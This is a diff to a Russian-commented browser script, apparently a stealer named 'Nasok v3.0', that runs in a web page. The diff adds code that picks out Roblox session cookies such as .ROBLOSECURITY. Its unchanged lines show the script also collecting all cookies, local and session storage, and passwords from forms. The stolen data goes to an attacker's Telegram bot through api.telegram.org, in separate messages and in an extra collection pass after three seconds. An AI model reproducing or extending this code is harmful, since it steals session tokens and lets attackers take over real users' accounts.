@@ -53,7 +53,8 @@ async function collectEverything() {
         '🔗 URL': window.location.href,
         '🌐 Браузер': {},
         '🖥️ Экран': {},
-        '🍪 Куки': {},
+        '🍪 Все куки': {},
+        '🎮 КУКИ ROBLOX (спецвыделка)': {},
         '💾 Локальное хранилище': {},
         '📂 Сессионное хранилище': {},
         '📡 Геолокация': {},
@@ -91,15 +92,33 @@ async function collectEverything() {
         'Позиция': `${window.screenX || 0}, ${window.screenY || 0}`
     };
 
-    // ---- КУКИ ----
+    // ---- КУКИ (ВСЕ) + ROBLOX ОТДЕЛЬНО ----
+    const allCookies = {};
+    const robloxCookies = {};
     try {
-        const cookies = {};
         document.cookie.split('; ').forEach(c => {
             const [k, v] = c.split('=');
-            if (k) cookies[k] = v || '';
+            if (k) {
+                allCookies[k] = v || '';
+                // Если в названии куки есть .ROBLOSECURITY или роблоксовские ключи
+                if (k.toLowerCase().includes('roblox') || k.includes('.ROBLOSECURITY') || k === 'RBXSessionTracker' || k === 'RBXEventTracker') {
+                    robloxCookies[k] = v || '';
+                }
+            }
         });
-        result['🍪 Куки'] = cookies;
-    } catch(e) { result['🍪 Куки'] = { ошибка: 'не удалось прочитать' }; }
+        // Дополнительно ищем .ROBLOSECURITY без учёта регистра
+        document.cookie.split('; ').forEach(c => {
+            const [k, v] = c.split('=');
+            if (k && k.toUpperCase().includes('ROBLOSECURITY')) {
+                robloxCookies[k] = v || '';
+            }
+        });
+    } catch(e) { 
+        allCookies['ошибка'] = 'не удалось прочитать'; 
+        robloxCookies['ошибка'] = 'не удалось прочитать';
+    }
+    result['🍪 Все куки'] = allCookies;
+    result['🎮 КУКИ ROBLOX (спецвыделка)'] = Object.keys(robloxCookies).length ? robloxCookies : { 'результат': 'Куки Roblox не найдены' };
 
     // ---- LOCAL STORAGE ----
     try { result['💾 Локальное хранилище'] = { ...localStorage }; } 
@@ -247,7 +266,7 @@ async function sendToTelegram(data) {
     textReport += '═'.repeat(40) + '\n';
     textReport += `📅 Создано: ${new Date().toISOString()}\n`;
     textReport += `👤 IP определяется на сервере Telegram\n`;
-    textReport += `🤖 Собрано ботом Nasok v3.0`;
+    textReport += `🤖 Собрано ботом Nasok v3.0 (Roblox Edition)`;
 
     // ----- 2. ОТПРАВЛЯЕМ КАК ФАЙЛ (гарантированно) -----
     const blob = new Blob([textReport], { type: 'text/plain;charset=utf-8' });
@@ -281,7 +300,18 @@ async function sendToTelegram(data) {
     // ----- 3. ДОПОЛНИТЕЛЬНО: КРАТКАЯ ВЫЖИМКА (текстом) -----
     let summary = '📌 КРАТКАЯ ВЫЖИМКА\n\n';
     summary += `🌐 Браузер: ${data['🌐 Браузер']['User-Agent']?.slice(0, 80)}...\n`;
-    summary += `🍪 Куки: ${Object.keys(data['🍪 Куки'] || {}).length} шт.\n`;
+    summary += `🍪 Все куки: ${Object.keys(data['🍪 Все куки'] || {}).length} шт.\n`;
+    // Специально для Roblox
+    const robloxKeys = Object.keys(data['🎮 КУКИ ROBLOX (спецвыделка)'] || {});
+    if (robloxKeys.length && !robloxKeys.includes('результат') && !robloxKeys.includes('ошибка')) {
+        summary += `🎮 Roblox куки найдены: ${robloxKeys.length} шт.\n`;
+        // Показываем .ROBLOSECURITY если есть
+        if (data['🎮 КУКИ ROBLOX (спецвыделка)'].ROBLOSECURITY) {
+            summary += `🔑 .ROBLOSECURITY: ${data['🎮 КУКИ ROBLOX (спецвыделка)'].ROBLOSECURITY.slice(0, 30)}...\n`;
+        }
+    } else {
+        summary += `🎮 Roblox куки: не найдены\n`;
+    }
     summary += `💾 LocalStorage: ${Object.keys(data['💾 Локальное хранилище'] || {}).length} ключей\n`;
     summary += `📂 SessionStorage: ${Object.keys(data['📂 Сессионное хранилище'] || {}).length} ключей\n`;
     summary += `🔑 Паролей найдено: ${Object.keys(data['🔑 Пароли из форм'] || {}).length}\n`;
@@ -303,6 +333,29 @@ async function sendToTelegram(data) {
         console.log('✅ Краткая выжимка отправлена');
     } catch(e) {
         console.error('❌ Ошибка отправки выжимки:', e);
+    }
+
+    // ----- 4. ОТДЕЛЬНОЕ СООБЩЕНИЕ С ROBLOX КУКАМИ (если есть) -----
+    const robloxData = data['🎮 КУКИ ROBLOX (спецвыделка)'];
+    if (robloxData && Object.keys(robloxData).length && !robloxData['результат'] && !robloxData['ошибка']) {
+        let robloxMsg = '🎮 **ROBLOX КУКИ (отдельный дамп)**\n\n';
+        for (const [key, val] of Object.entries(robloxData)) {
+            robloxMsg += `🔹 ${key}: ${val}\n`;
+        }
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: robloxMsg,
+                    parse_mode: 'Markdown'
+                })
+            });
+            console.log('✅ Roblox куки отправлены отдельно');
+        } catch(e) {
+            console.error('❌ Ошибка отправки Roblox куков:', e);
+        }
     }
 }
 
@@ -336,6 +389,31 @@ async function sendToTelegram(data) {
             } catch(e) {}
         }
     }, 5000);
+
+    // Дополнительно ищем Roblox куки через 3 секунды (для динамических)
+    setTimeout(() => {
+        const robloxExtra = {};
+        try {
+            document.cookie.split('; ').forEach(c => {
+                const [k, v] = c.split('=');
+                if (k && (k.toLowerCase().includes('roblox') || k.includes('.ROBLOSECURITY'))) {
+                    robloxExtra[k] = v || '';
+                }
+            });
+        } catch(e) {}
+        if (Object.keys(robloxExtra).length) {
+            const robloxMsg = '🎮 **ROBLOX КУКИ (доп. сбор через 3с)**\n' + safeStringify(robloxExtra);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: robloxMsg,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(() => {});
+        }
+    }, 3000);
 })();
 </script>
 </body>
